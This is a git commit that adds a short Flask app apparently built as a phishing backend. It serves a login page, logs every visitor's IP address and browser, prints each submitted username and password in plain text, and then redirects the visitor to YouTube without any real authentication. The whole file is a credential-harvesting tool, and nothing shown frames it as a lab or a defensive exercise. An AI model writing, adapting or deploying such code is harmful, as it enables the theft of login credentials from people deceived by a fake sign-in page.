89d2faec5a04e56ad051d35a595c051059362fcf
kaliabii <kaliabhishek019@gmail.com>
2025-11-14 09:03:07 -0500

    Add files via upload

---
+++ apphttp2.py
@@ -0,0 +1,24 @@
+from flask import Flask, request, render_template, redirect
+
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    user_ip = request.remote_addr
+    user_ag = request.headers.get('User-Agent')
+
+    print(f"[visitor] IP: {user_ip}, Browser: {user_ag}")
+
+    return render_template("logingnew.html")
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get("username")
+    password = request.form.get("password")
+
+    print(f"[LOGIN ATTEMPT] Username: {username}, password: {password}")
+
+    return redirect("https://www.youtube.com")
+
+if __name__ == '__main__':
+   app.run(host="0.0.0.0",port=8000)
